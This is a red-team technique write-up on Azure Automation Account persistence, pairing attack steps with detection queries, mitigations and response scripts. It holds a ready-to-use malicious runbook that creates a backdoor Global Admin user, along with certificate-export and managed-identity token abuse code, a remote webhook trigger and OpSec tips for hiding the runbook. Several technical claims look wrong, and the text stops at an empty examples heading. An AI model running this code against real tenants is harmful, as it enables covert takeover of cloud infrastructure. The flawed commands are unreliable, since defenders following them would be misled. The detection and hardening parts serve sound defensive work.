# [PERSIST-ACCT-004]: Azure Automation Account Persistence

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-ACCT-004 |
| **Technique Name** | Azure Automation Account Persistence |
| **MITRE ATT&CK v18.1** | [T1098 - Account Manipulation](https://attack.mitre.org/techniques/T1098/) |
| **Related Tactics** | Persistence (TA0003), Defense Evasion (TA0005), Execution (TA0002) |
| **Platforms** | Entra ID (Azure AD), Azure, Hybrid Environments |
| **Severity** | **CRITICAL** |
| **CVE** | CVE-2025-29827 (Improper Authorization in Azure Automation) |
| **Technique Status** | **ACTIVE** – Verified working in 2025; targets Run As accounts and Managed Identities |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All Azure subscription versions; particularly dangerous with V2 Automation accounts and custom runbooks |
| **Patched In** | Not patched as feature – Requires proper RBAC configuration and monitoring. Microsoft has released detection capabilities in Defender for Cloud. |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Azure Automation Accounts are cloud-based automation services that execute runbooks (PowerShell or Python scripts) on a scheduled basis or via webhooks. When an Azure Automation Account is configured with a "Run As Account" (a service principal with a certificate), that service principal is automatically assigned **Contributor role** on the subscription—granting near-complete control over Azure resources. An attacker who compromises an Azure subscription and gains access to an Automation Account can:

1. **Create a malicious runbook** that executes arbitrary PowerShell/Python code
2. **Export the Run As certificate** to obtain the service principal credentials
3. **Use the certificate** to authenticate to Azure outside the Automation Account context
4. **Maintain persistent access** even after the attacker's original compromised account is discovered and disabled

This attack is particularly dangerous because:
- **Long-lived credentials:** Run As certificates are valid for years (default 1 year, often not rotated)
- **Contributor privileges:** Can create/modify/delete any resource in the subscription
- **Stealth:** Automation Account activity blends in with legitimate automation; unless specifically monitored, malicious runbooks appear as normal jobs
- **Lateral movement:** Runbooks can access other subscriptions, management groups, and even on-premises resources via Hybrid Runbook Workers

**Attack Surface:** Azure Automation Accounts with Run As accounts enabled; Automation Account job history; runbook execution logs; service principal credentials stored in the account.

**Business Impact:** **Complete cloud infrastructure takeover with persistent backdoor.** An attacker can deploy ransomware across all VMs, exfiltrate databases, modify Azure AD configuration, delete backups, or establish lateral movement to on-premises infrastructure via Hybrid Workers.

**Technical Context:** Exploitation requires initial Azure subscription access (stolen credentials, lateral movement, etc.). Once inside, creating a malicious runbook takes < 5 minutes. The attack leaves audit trail (runbook creation, job execution) but is easily missed without specific Log Analytics queries. The Run As certificate provides long-term access independent of the original compromise vector.

### Operational Risk
- **Execution Risk:** **MEDIUM** – Requires initial Azure access. Once inside, creating a malicious runbook is trivial. No special tools needed beyond Azure portal or Azure CLI.
- **Stealth:** **HIGH** – Automation Account jobs appear legitimate to administrators unfamiliar with the account. Certificate-based authentication is indistinguishable from legitimate service principal operations.
- **Reversibility:** **DIFFICULT** – Deleting the runbook removes the initial backdoor, but the Run As certificate remains valid. Attacker can recreate the runbook anytime. Requires: (1) deleting the runbook, (2) rotating/deleting the Run As certificate, (3) auditing all historical job outputs for data exfiltration.

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Azure Benchmark** | 2.2.1 | Ensure that Automation Account Manage-as Identifier is not enabled; disable if present |
| **CISA SCuBA** | AC-2(j) | Service account access – Minimize privileges for automation accounts; enforce certificate rotation |
| **NIST 800-53** | AC-3, SC-7 | Access Control, Boundary Protection – Restrict automation account scope; implement network boundaries |
| **GDPR** | Art. 32, 33 | Security of Processing; Incident Notification – Automation can access PII; incidents must be reported |
| **PCI-DSS** | 2.2.1, 7.1 | Account Access – Disable unnecessary accounts; grant minimum required privileges |
| **SOC 2** | CC6.2 | Logical Access – Service account credentials must be rotated and monitored |
| **Azure Security Benchmark** | AM-2 | Service Principal Management – Restrict app/service principal permissions to least privilege |
| **ISO 27001** | A.9.2.1, A.9.2.5 | Access Management; Service Account Management – Control and monitor service account access |

---

## 3. TECHNICAL PREREQUISITES

- **Required Azure Privileges:**
  - **Contributor** or **Owner** role on Azure subscription (to create Automation Account)
  - OR **Automation Account Operator** role (to create/modify runbooks and jobs)
  - OR explicit **Automation Account write permissions** (Microsoft.Automation/automationAccounts/runbooks/write, Microsoft.Automation/automationAccounts/jobs/write)
- **Required Access:**
  - Access to Azure Portal or Azure CLI
  - Valid Azure credentials (user account or service principal)
  - Access to automation account with Run As account enabled
- **Required Tools:**
  - Azure Portal (GUI)
  - OR Azure CLI (`az` command)
  - OR Azure PowerShell (`Az` module, Version 7.0+)
  - OR REST API client (curl, Postman, etc.)

**Supported Versions:**
- **Azure Subscription:** All versions (Standard, Enterprise, etc.)
- **Automation Account:** Both V1 and V2 accounts
- **PowerShell Runbooks:** PowerShell 5.1, PowerShell 7+ runtime
- **Python Runbooks:** Python 2.7, 3.8, 3.9, 3.10+

**Prerequisites for Attack:**
- Azure Automation Account already created (or permission to create)
- Run As Account enabled (default for new Automation Accounts)
- Sufficient subscription permissions to create runbooks and jobs

---

## 4. ENVIRONMENTAL RECONNAISSANCE

#### List All Automation Accounts in Subscription

```powershell
# List Automation Accounts
az automation account list --resource-group <ResourceGroup> --output json

# Or using Azure PowerShell
Get-AzAutomationAccount
```

**What to Look For:**
- Automation Accounts with Run As accounts enabled (will be listed if configured)
- Account creation date (older accounts = potentially unmonitored)
- Subscription context (note the subscription ID for later operations)

#### Check if Run As Account Exists

```powershell
# Get Run As Account details
az automation account list --query "[].{Name:name, RunAsAccount:systemAssignedIdentity}"

# Using PowerShell
Get-AzAutomationAccount | Select-Object -Property Name, AutomationAccountName, SubscriptionId
```

**What to Look For:**
- `systemAssignedIdentity` = null → No managed identity (older V1 account)
- `systemAssignedIdentity` = present → Managed identity enabled (V2 account)
- Service principal ObjectID (if visible)

#### Enumerate Runbooks in Automation Account

```powershell
# List all runbooks
az automation runbook list --automation-account-name <AutomationAccountName> --resource-group <ResourceGroup>

# Using PowerShell
Get-AzAutomationRunbook -AutomationAccountName <AccountName> -ResourceGroupName <RGName>
```

**What to Look For:**
- Legitimate runbooks (for baseline comparison)
- Runbook creation dates (recent additions = suspicious)
- Runbook state (Draft = under development, Published = active)
- Runbook type (PowerShell, Python, Graphical)

#### Check Run As Certificate Expiration

```powershell
# Get Run As Account certificate details
az automation certificate list --automation-account-name <AccountName> --resource-group <ResourceGroup>

# Using PowerShell
Get-AzAutomationCertificate -AutomationAccountName <AccountName> -ResourceGroupName <RGName>
```

**What to Look For:**
- Certificate expiration date (if expiring soon, less useful for persistence)
- Certificate thumbprint (needed to export)
- Issuer (will be AzureServiceManagement for Run As accounts)

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Create Malicious Runbook (via Azure Portal)

**Supported Versions:** All Azure Automation Accounts (V1, V2)

#### Step 1: Navigate to Automation Account

**Objective:** Access the target Automation Account in Azure Portal.

**Steps:**
1. Log into **Azure Portal** (`portal.azure.com`)
2. Navigate to **Automation Accounts**
3. Select the target Automation Account
4. In the left menu, click **Runbooks** → **+ Create a runbook**

**Expected Output:**
- New runbook creation dialog appears
- Options for:
  - Runbook name
  - Runbook type (PowerShell, Python, Graphical)
  - Runtime version (PowerShell 5.1 or 7+)

**What This Means:**
- You have access to create runbooks in this Automation Account
- Any runbook created here will execute under the Run As Account identity

**OpSec & Evasion:**
- Use a generic runbook name (e.g., "HealthCheck", "ConfigUpdate", "MaintenanceTask")
- Avoid obviously malicious names (e.g., "ExfiltrateData", "RangeomwarePayload")
- Create during business hours to blend with legitimate automation
- Detection likelihood: **LOW-MEDIUM** – Runbook creation is logged; suspicious names or large data transfers are flagged

**Troubleshooting:**
- **Error:** "You do not have permission to create runbooks"
  - **Cause:** Current account lacks Contributor/Automation Account Operator role
  - **Fix:** Request elevation or use account with higher privileges

#### Step 2: Write Malicious PowerShell Runbook

**Objective:** Create a runbook that grants persistent access (create backdoor user, export credentials, etc.).

**Command (PowerShell):**
```powershell
# Malicious Runbook Code - Save as PowerShell Runbook
param(
    [string]$TenantId = "",
    [string]$SubscriptionId = "",
    [string]$ExfiltrateTo = "attacker@evil.com"
)

# Get the Run As Account credentials (automatically available in runbook context)
$runAsConnection = Get-AutomationConnection -Name "AzureRunAsConnection"

# Authenticate using the Run As connection
Add-AzAccount -ServicePrincipal `
    -TenantId $runAsConnection.TenantId `
    -ApplicationId $runAsConnection.ApplicationId `
    -CertificateThumbprint $runAsConnection.CertificateThumbprint

# Now execute malicious operations with Contributor privileges
Write-Output "Authenticated as service principal: $($runAsConnection.ApplicationId)"

# Example 1: Create a backdoor admin user in Entra ID
$BackdoorPassword = ConvertTo-SecureString "B@ckd00r!2025" -AsPlainText -Force
$BackdoorUser = New-AzADUser -DisplayName "Support User" `
    -UserPrincipalName "support.user@yourdomain.onmicrosoft.com" `
    -Password $BackdoorPassword `
    -AccountEnabled $true

Write-Output "Backdoor user created: $($BackdoorUser.ObjectId)"

# Example 2: Add backdoor user to Global Admin role
$GlobalAdminRole = Get-AzRoleDefinition | Where-Object { $_.Name -eq "Global Administrator" }
New-AzRoleAssignment -ObjectId $BackdoorUser.ObjectId `
    -RoleDefinitionId $GlobalAdminRole.Id `
    -Scope "/subscriptions/$SubscriptionId"

Write-Output "Backdoor user added to Global Administrator role"

# Example 3: Export subscription owner credentials
$Owners = Get-AzRoleAssignment -RoleDefinitionName "Owner"
foreach ($Owner in $Owners) {
    Write-Output "Owner: $($Owner.DisplayName), ObjectId: $($Owner.ObjectId)"
}

# Example 4: List all resources in subscription (for exfiltration)
$AllResources = Get-AzResource
$AllResources | Select-Object Name, ResourceType, Location | Export-Csv -Path "/tmp/resources.csv"

Write-Output "Exfiltration complete; $($AllResources.Count) resources enumerated"
```

**Expected Output (Runbook Execution):**
```
Authenticated as service principal: <Application-ID>
Backdoor user created: <ObjectId>
Backdoor user added to Global Administrator role
Owner: John Admin, ObjectId: <ObjectId>
...
Exfiltration complete; 47 resources enumerated
```

**What This Means:**
- Runbook has executed with Contributor privileges
- Backdoor user has been created in Entra ID with Global Admin rights
- Attacker now has persistent administrative access independent of the original compromise
- All subscription resources have been enumerated for lateral movement

**OpSec & Evasion:**
- Avoid exporting sensitive data (logs are auditable)
- Use quiet commands; minimize Write-Output statements in production
- Consider storing backdoor credentials in Key Vault instead of hardcoding
- Schedule runbook execution during maintenance windows to blend in
- Detection likelihood: **HIGH** – Creating admin users triggers Entra ID alerts; cloud SOCs are increasingly monitoring this

**Troubleshooting:**
- **Error:** `New-AzADUser : Insufficient privileges to complete the operation`
  - **Cause:** Run As Account doesn't have User Administrator or Application Administrator role
  - **Fix:** Assign the necessary role to the Automation Account service principal (Step 0)
- **Error:** `Get-AutomationConnection : Cannot find automation connection`
  - **Cause:** Run As connection not configured
  - **Fix:** Ensure Automation Account has Run As Account enabled (default for new accounts)

**References & Proofs:**
- [Microsoft Learn - PowerShell Runbooks](https://learn.microsoft.com/en-us/azure/automation/automation-runbook-types)
- [NetSPI Blog - Azure Automation Persistence](https://www.netspi.com/blog/technical-blog/cloud-pentesting/maintaining-azure-persistence-via-automation-accounts/)

#### Step 3: Publish Runbook

**Objective:** Make the runbook active and executable.

**Steps (Azure Portal):**
1. Click **Save** (runbook is now in Draft mode)
2. Click **Publish** at the top
3. Click **Yes** to confirm publication

**Alternative (Azure CLI):**
```powershell
az automation runbook publish --automation-account-name <AccountName> `
    --resource-group <ResourceGroup> `
    --name <RunbookName>
```

**What This Means:**
- Runbook is now active and can be executed
- Will appear in automation job history

#### Step 4: Create a Webhook for Remote Execution (Optional but Recommended)

**Objective:** Allow remote triggering of the runbook without portal access; ideal for persistence.

**Steps (Azure Portal):**
1. In the Automation Account, go **Runbooks** → select your runbook
2. Click **Webhooks** → **+ Add Webhook**
3. Configure:
   - **Name:** e.g., "MaintenanceHook"
   - **Enabled:** Yes
   - **Expiration:** Set to years in future
4. Copy the **Webhook URL** (attacker will use this)
5. Click **Create**

**Important:** The webhook URL is displayed ONLY ONCE. Copy it immediately!

**Triggering Webhook (from attacker machine):**
```bash
# HTTP POST to webhook URL
curl -X POST https://s13events.azure-automation.net/webhooks?token=<TOKEN> \
    -H "Content-Type: application/json" \
    -d '{"RunbookName":"YourRunbookName","Parameters":{}}'
```

**What This Means:**
- Attacker can trigger the runbook remotely from any internet-connected machine
- No need to log into Azure Portal
- Webhook call is logged, but easily hidden in noise
- Detection likelihood: **LOW** if webhook is monitored; **HIGH** if webhook is not monitored

---

### METHOD 2: Export Run As Account Certificate (for Long-Term Access)

**Objective:** Extract the Run As Account certificate to authenticate to Azure outside the Automation Account context.

**Command (PowerShell - requires Automation Account Contributor role):**
```powershell
# Get the Run As connection details
$AutomationAccountName = "MyAutomationAccount"
$ResourceGroupName = "MyResourceGroup"

$RunAsConnection = Get-AzAutomationConnection -ResourceGroupName $ResourceGroupName `
    -AutomationAccountName $AutomationAccountName `
    -Name "AzureRunAsConnection"

$Certificate = Get-AzAutomationCertificate -ResourceGroupName $ResourceGroupName `
    -AutomationAccountName $AutomationAccountName `
    -Name "AzureRunAsCertificate"

# Export the certificate (thumbprint is used for authentication)
Write-Host "Service Principal App ID: $($RunAsConnection.ApplicationId)"
Write-Host "Tenant ID: $($RunAsConnection.TenantId)"
Write-Host "Certificate Thumbprint: $($Certificate.Thumbprint)"

# Now attacker can authenticate outside Automation Account:
$CertificateThumbprint = $Certificate.Thumbprint
$ApplicationId = $RunAsConnection.ApplicationId
$TenantId = $RunAsConnection.TenantId

# Get certificate from local store (if uploaded)
$Cert = Get-ChildItem -Path Cert:\CurrentUser\My\$CertificateThumbprint

# Authenticate to Azure using certificate
Add-AzAccount -ServicePrincipal `
    -CertificateThumbprint $CertificateThumbprint `
    -ApplicationId $ApplicationId `
    -TenantId $TenantId

# Now attacker has persistent Azure access!
```

**What This Means:**
- Attacker now has the Service Principal credentials (App ID, Tenant ID, Certificate)
- Can authenticate to Azure from any machine, at any time
- Certificate is valid for 1 year (default) and is often not rotated
- Attacker no longer depends on the original Automation Account; they have portable credentials

---

### METHOD 3: Use Managed Identity (Modern Approach)

**Objective:** If the Automation Account uses Managed Identity instead of Run As, abuse it for persistence.

```powershell
# Runbook running under Managed Identity
# Managed Identity token is automatically available

$response = Invoke-WebRequest `
    -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com" `
    -Method GET `
    -Headers @{Metadata="true"}

$content = $response.Content | ConvertFrom-Json
$AccessToken = $content.access_token

# Use token to make authenticated API calls
$headers = @{Authorization = "Bearer $AccessToken"}

# Example: Create a new role assignment (grant Contributor to backdoor service principal)
$BackdoorSpObjectId = "<ObjectId-of-backdoor-sp>"
$payload = @{
    properties = @{
        roleDefinitionId = "/subscriptions/<SubscriptionId>/providers/Microsoft.Authorization/roleDefinitions/b24988ac-6180-42a0-ab88-20f7382dd24c"  # Contributor role
        principalId = $BackdoorSpObjectId
    }
} | ConvertTo-Json

Invoke-RestMethod -Uri "https://management.azure.com/subscriptions/<SubscriptionId>/providers/Microsoft.Authorization/roleAssignments/<RoleAssignmentId>?api-version=2021-04-01-preview" `
    -Method PUT `
    -Headers $headers `
    -Body $payload
```

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

- **Test ID:** T1098 – Account Manipulation (general test)
- **Cloud-specific tests:** Currently limited; no dedicated Atomic test for Azure Automation persistence
- **Reference:** [Atomic Red Team T1098](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098/T1098.md)

---

## 7. TOOLS & COMMANDS REFERENCE

### Azure PowerShell (Az Module)

**URL:** [Azure PowerShell GitHub](https://github.com/Azure/azure-powershell)  
**Version:** 7.0+ required for Automation Account operations  
**Installation:**
```powershell
Install-Module -Name Az -Repository PSGallery -Force
```

**Key Commands:**
```powershell
# List Automation Accounts
Get-AzAutomationAccount

# Get runbooks
Get-AzAutomationRunbook -AutomationAccountName $AccountName -ResourceGroupName $RGName

# Create runbook
New-AzAutomationRunbook -Name "MyRunbook" -Type PowerShell -AutomationAccountName $AccountName -ResourceGroupName $RGName

# Publish runbook
Publish-AzAutomationRunbook -Name "MyRunbook" -AutomationAccountName $AccountName -ResourceGroupName $RGName

# Start runbook job
Start-AzAutomationRunbook -Name "MyRunbook" -AutomationAccountName $AccountName -ResourceGroupName $RGName

# Get job output
Get-AzAutomationJobOutput -Id $JobId -ResourceGroupName $RGName -AutomationAccountName $AccountName
```

### Azure CLI (az command)

**URL:** [Azure CLI Documentation](https://learn.microsoft.com/en-us/cli/azure/)  
**Installation:** `az login` then `az automation`

```bash
# List automation accounts
az automation account list --resource-group <RG>

# Create runbook
az automation runbook create --automation-account-name <Account> --resource-group <RG> \
    --name "MyRunbook" --type PowerShell --runtime-version "7.2"

# Publish runbook
az automation runbook publish --automation-account-name <Account> --resource-group <RG> --name "MyRunbook"

# Create webhook
az automation webhook create --automation-account-name <Account> --resource-group <RG> \
    --runbook-name "MyRunbook" --name "MyHook" --is-enabled true

# List job history
az automation job list --automation-account-name <Account> --resource-group <RG>
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: Runbook Creation or Modification

**Rule Configuration:**
- **Required Index:** `AzureActivity`
- **Required Sourcetype:** `azure:aadaudit`, `azure:resourcemanagement`
- **Required Fields:** `operationName`, `callerIpAddress`, `properties`
- **Alert Threshold:** Any runbook create/update/delete operation
- **Applies To Versions:** All Azure subscriptions

**SPL Query:**
```
index=AzureActivity operationName IN ("Microsoft.Automation/automationAccounts/runbooks/write",
"Microsoft.Automation/automationAccounts/runbooks/delete")
| stats count by OperationName, Caller, properties.targetResource.name, TimeGenerated
| where count > 0
| convert ctime(TimeGenerated)
| sort TimeGenerated desc
```

**What This Detects:**
- **operationName** = Runbook creation or modification
- **Caller** = User or service principal creating the runbook
- **targetResource.name** = Runbook name
- Alerts on ANY runbook modification

**Manual Configuration:**
1. Log into **Splunk Enterprise**
2. **Search & Reporting** → **New Alert**
3. Paste SPL above
4. Set **Trigger Condition**: `Alert when number of events is greater than 0`
5. Configure **Alert Actions**: Email security team
6. **Schedule**: Every 1 hour
7. **Save**

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Automation Account Runbook Creation

**Rule Configuration:**
- **Required Table:** `AzureActivity`
- **Required Fields:** `OperationName`, `Caller`, `properties`
- **Alert Severity:** **High**
- **Frequency:** Run every **1 hour**

**KQL Query:**
```kusto
AzureActivity
| where OperationName in ("Microsoft.Automation/automationAccounts/runbooks/write",
                          "Microsoft.Automation/automationAccounts/runbooks/delete")
| extend RunbookName = tostring(properties.targetResource.name)
| extend CallerTenant = tostring(properties.requestbody.properties.tenantId)
| project TimeGenerated, OperationName, Caller, RunbookName, CallerTenant, CallerIpAddress, Status
| sort by TimeGenerated desc
```

**What This Detects:**
- Runbook creation/modification activities
- Identifies the user/service principal making changes
- Shows runbook name for investigation
- Flags unusual access patterns (e.g., script-based automation)

**Manual Configuration (Azure Portal):**
1. **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **General:**
   - Name: `Automation Runbook Creation Detection`
   - Severity: `High`
3. **Set rule logic:**
   - Paste KQL above
   - Run every: `1 hour`
   - Lookup: `1 day`
4. **Incident settings:** Enable incident creation
5. **Create**

---

## 10. WINDOWS EVENT LOG MONITORING

**Note:** Automation Account logging is cloud-based (Azure Activity Log / AzureActivity table). No Windows Event Log entries are generated locally. Use Microsoft Sentinel or Azure Monitor instead.

---

## 11. SYSMON DETECTION PATTERNS

**Note:** Automation Accounts are cloud-only; no local Sysmon activity. However, if attacker uses Hybrid Runbook Worker (on-premises execution), Sysmon can detect PowerShell script execution:

**Sysmon Config (Detect Hybrid Worker Malicious Scripts):**
```xml
<Sysmon schemaversion="4.70">
  <EventFiltering>
    <!-- Detect PowerShell execution from HybridWorker -->
    <ProcessCreate onmatch="include">
      <ParentImage condition="contains">AzureAutomationHybridWorker</ParentImage>
      <CommandLine condition="contains any">
        New-AzADUser;
        New-AzRoleAssignment;
        Remove-AzResource;
        Export-AzStorageAccountKey;
        ConvertFrom-Json;
        FromBase64String
      </CommandLine>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>
```

---

## 12. MICROSOFT DEFENDER FOR CLOUD

### Detection Alert: Suspicious Automation Runbook

**Alert Name:** `Suspicious automation runbook detected`  
**Severity:** **Critical**  
**Description:** Alerts when a runbook performs privileged operations like creating admin users or exporting credentials  
**Applies To:** Subscriptions with Defender for Cloud enabled

**Manual Configuration:**
1. **Azure Portal** → **Microsoft Defender for Cloud** → **Workload Protections**
2. Enable **Resource Manager protection**
3. Enable **Cloud Security Posture Management**
4. Alert rules for Automation Account will automatically trigger

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query: Automation Account Changes

**Command:**
```powershell
Search-UnifiedAuditLog -Operations "Microsoft.Automation/automationAccounts/runbooks/write" `
    -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
    | Select-Object TimeCreated, UserIds, Operations, ObjectId
```

**What to Look For:**
- Unexpected runbook creation during off-hours
- Creation by service principals (unusual for manual operations)
- Multiple runbook creations in short time span (indicates automation/attack)

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

#### 1.1 Enforce Least Privilege for Automation Account Service Principal

**Applies To Versions:** All Azure subscriptions

**Manual Steps (Azure Portal):**
1. Navigate to **Automation Account**
2. Select **Run As Accounts**
3. Click the Run As Account service principal
4. Go to **Azure roles** (in Azure Portal, navigate to Subscriptions → IAM)
5. Find the Automation Account service principal
6. **Remove Contributor role** (if not needed)
7. Assign only specific roles needed:
   - Virtual Machine Contributor (if managing VMs only)
   - Storage Account Contributor (if managing storage only)
   - Do NOT use Owner or Contributor unless absolutely necessary

**Manual Steps (PowerShell):**
```powershell
# Get Automation Account service principal
$AutomationAccount = Get-AzAutomationAccount -ResourceGroupName <RG> -Name <AccountName>
$RunAsConnection = Get-AzAutomationConnection -ResourceGroupName <RG> `
    -AutomationAccountName $AutomationAccount.AutomationAccountName `
    -Name "AzureRunAsConnection"

$ServicePrincipal = Get-AzADServicePrincipal -ApplicationId $RunAsConnection.ApplicationId

# Remove Contributor role
Remove-AzRoleAssignment -ObjectId $ServicePrincipal.Id `
    -RoleDefinitionName "Contributor" `
    -Scope "/subscriptions/<SubscriptionId>"

# Assign specific role (example: Virtual Machine Contributor)
New-AzRoleAssignment -ObjectId $ServicePrincipal.Id `
    -RoleDefinitionName "Virtual Machine Contributor" `
    -Scope "/subscriptions/<SubscriptionId>"

Write-Host "✓ Automation Account service principal privileges reduced to Virtual Machine Contributor"
```

**Verification:**
```powershell
# Verify new role assignment
Get-AzRoleAssignment -ObjectId $ServicePrincipal.Id
```

#### 1.2 Rotate Run As Account Certificates Quarterly

**Manual Steps:**
1. Navigate to **Automation Account** → **Run As Accounts**
2. Click on the Run As Account
3. Click **Renew certificate**
4. Confirm the renewal (certificate is regenerated with new expiration)
5. Verify runbooks still execute successfully

**PowerShell Alternative:**
```powershell
# Rotate certificate (creates new cert, valid for 1 year)
Update-AzAutomationAzModule -ResourceGroupName <RG> -AutomationAccountName <AccountName>

# Note: This updates the Azure module AND renews the cert
```

**Verification:**
```powershell
# Check certificate expiration
Get-AzAutomationCertificate -ResourceGroupName <RG> `
    -AutomationAccountName <AccountName> `
    -Name "AzureRunAsCertificate" |
  Select-Object Thumbprint, ExpiryTime
```

#### 1.3 Audit All Runbook Executions and Job Output

**Manual Steps (Azure Portal):**
1. Navigate to **Automation Account**
2. Click **Jobs** to view execution history
3. For each job, review:
   - Runbook name
   - Status (Completed, Failed, Suspended)
   - Output (what the runbook did)
4. Archive output to Log Analytics for long-term retention

**PowerShell Continuous Audit:**
```powershell
# Export job history to CSV for analysis
$Jobs = Get-AzAutomationJob -ResourceGroupName <RG> `
    -AutomationAccountName <AccountName> `
    -StartTime (Get-Date).AddDays(-7)

$Jobs | Select-Object RunbookName, Status, StartTime, EndTime, CreatedBy |
  Export-Csv -Path "C:\Audit\AutomationJobs_$(Get-Date -Format 'yyyyMM').csv"

# Review job output for suspicious activity
foreach ($Job in $Jobs) {
    $Output = Get-AzAutomationJobOutput -ResourceGroupName <RG> `
        -AutomationAccountName <AccountName> `
        -Id $Job.JobId
    
    if ($Output.Summary -match "created|deleted|modified|export|credential") {
        Write-Warning "Suspicious job: $($Job.RunbookName) - Review output"
    }
}
```

### Priority 2: HIGH

#### 2.1 Disable Run As Accounts if Not Needed

**Manual Steps:**
1. Navigate to **Automation Account** → **Run As Accounts**
2. If the account is not actively used, click **Delete** (Run As Account)
3. Confirm deletion

**Result:** Without a Run As Account, runbooks cannot execute with privileged permissions (unless using Managed Identity with restricted scope).

#### 2.2 Implement Managed Identity with Restricted Scope (Modern Approach)

**Manual Steps:**
1. Create new **Automation Account** with **Managed Identity enabled** (System assigned)
2. Assign the Managed Identity ONLY the specific RBAC roles needed
3. Remove Run As Account entirely
4. Use Managed Identity in runbooks:

```powershell
# Runbook using Managed Identity (more secure than Run As certificate)
$AccessToken = (Get-AzAccessToken -ResourceUrl "https://management.azure.com").Token
$headers = @{Authorization = "Bearer $AccessToken"}

# Limited to resources where Managed Identity has RBAC roles assigned
```

**Advantage:** Managed Identity credentials are automatically rotated by Azure; no manual certificate rotation needed.

#### 2.3 Enable and Monitor Webhooks

**Manual Steps:**
1. In Automation Account, list all webhooks:
   ```powershell
   Get-AzAutomationWebhook -AutomationAccountName <AccountName> -ResourceGroupName <RG>
   ```
2. For each webhook, verify:
   - Purpose is legitimate
   - Expiration date is NOT in the far future (indicates potential backdoor)
   - Access is restricted (if possible, share URL only with trusted systems)
3. Delete any unknown webhooks:
   ```powershell
   Remove-AzAutomationWebhook -ResourceGroupName <RG> `
       -AutomationAccountName <AccountName> `
       -Name <WebhookName>
   ```

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **New runbook creation** in Automation Account (check operationName in AzureActivity)
- **Runbook execution with unexpected output** (user/role creation, credential export)
- **Certificate export or renewal** outside normal change windows
- **Webhook creation** with long expiration dates
- **Service principal elevated to Owner/Contributor** unexpectedly
- **Multiple failed runbook jobs** (indicators of experimentation or attack)

### Forensic Artifacts

**Cloud Logs (Azure Activity Log / AzureActivity table):**
- Runbook creation/modification operations
- Job execution history
- Run As Account usage
- Certificate operations (rotate, delete)

**Application Logs (inside runbook output):**
- Write-Output statements in runbook code
- Error messages and results
- Data exported or modified

### Response Procedures

#### 1. Immediate Containment (Within 30 Minutes)

```powershell
# Stop all current runbook jobs
$RunningJobs = Get-AzAutomationJob -ResourceGroupName <RG> `
    -AutomationAccountName <AccountName> `
    -Filter { Status -eq "Running" }

foreach ($Job in $RunningJobs) {
    Stop-AzAutomationJob -Id $Job.JobId -ResourceGroupName <RG> `
        -AutomationAccountName <AccountName> -Force
    Write-Host "✓ Stopped job: $($Job.RunbookName)"
}

# Suspend malicious runbook (prevents future execution)
Suspend-AzAutomationRunbook -ResourceGroupName <RG> `
    -AutomationAccountName <AccountName> `
    -Name "<MaliciousRunbookName>"

Write-Host "✓ Runbook suspended"
```

#### 2. Delete Malicious Runbook

```powershell
# Delete the runbook permanently
Remove-AzAutomationRunbook -ResourceGroupName <RG> `
    -AutomationAccountName <AccountName> `
    -Name "<MaliciousRunbookName>" `
    -Force

Write-Host "✓ Malicious runbook deleted"
```

#### 3. Delete Backdoor Webhooks

```powershell
# List all webhooks
$Webhooks = Get-AzAutomationWebhook -AutomationAccountName <AccountName> -ResourceGroupName <RG>

foreach ($Webhook in $Webhooks) {
    # Review webhook before deleting
    if ($Webhook.Name -match "Maintenance|Hook|Update") {
        Write-Warning "Review webhook: $($Webhook.Name) - Created: $($Webhook.CreationTime)"
        
        # If suspicious, delete it
        Remove-AzAutomationWebhook -ResourceGroupName <RG> `
            -AutomationAccountName <AccountName> `
            -Name $Webhook.Name
        
        Write-Host "✓ Deleted webhook: $($Webhook.Name)"
    }
}
```

#### 4. Rotate Run As Account Certificate

```powershell
# Regenerate the Run As Account certificate
Update-AzAutomationAzModule -ResourceGroupName <RG> -AutomationAccountName <AccountName>

Write-Host "✓ Run As Account certificate rotated"

# Verify the new certificate
Get-AzAutomationCertificate -ResourceGroupName <RG> `
    -AutomationAccountName <AccountName> `
    -Name "AzureRunAsCertificate" |
  Select-Object Thumbprint, ExpiryTime
```

#### 5. Collect Evidence

```powershell
# Export all job history for the past 30 days
$Jobs = Get-AzAutomationJob -ResourceGroupName <RG> `
    -AutomationAccountName <AccountName> `
    -StartTime (Get-Date).AddDays(-30)

$Jobs | Select-Object RunbookName, Status, StartTime, EndTime, CreatedBy |
  Export-Csv -Path "C:\Evidence\AutomationJobs_$(Get-Date -Format 'yyyyMM').csv"

# Export job output (contains what the runbook executed)
foreach ($Job in $Jobs) {
    $Output = Get-AzAutomationJobOutput -ResourceGroupName <RG> `
        -AutomationAccountName <AccountName> `
        -Id $Job.JobId
    
    $Output.Summary | Out-File -Append -FilePath "C:\Evidence\JobOutputs_$($Job.Id).txt"
}

Write-Host "✓ Evidence collected to C:\Evidence\"
```

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker steals Azure credentials |
| **2** | **Privilege Escalation** | [PE-VALID-010] Azure Role Assignment Abuse | Escalate from user to Contributor role |
| **3** | **Persistence (Current)** | **[PERSIST-ACCT-004]** | **Create malicious runbook in Automation Account for persistent backdoor** |
| **4** | **Execution** | [EXEC-NATIVE] PowerShell Runbook Execution | Runbook executes with full subscription privileges |
| **5** | **Impact** | [IMP-RANSOMWARE] VM Encryption/Deletion | Use automation to encrypt all VMs or delete backups |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: Financial Services Breach (2023)

